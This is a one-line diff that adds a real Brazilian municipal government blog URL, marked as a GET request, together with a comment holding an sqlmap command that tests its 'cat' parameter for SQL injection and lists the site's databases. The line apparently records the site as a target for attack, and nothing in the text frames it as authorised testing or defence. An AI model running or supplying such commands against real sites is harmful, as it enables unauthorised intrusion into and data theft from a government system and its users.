@@ -1,0 +1,1 @@
+http://cedral.ma.gov.br/blog?cat=4 (GET)  # sqlmap.py -u http://cedral.ma.gov.br/blog?cat=4 --dbs
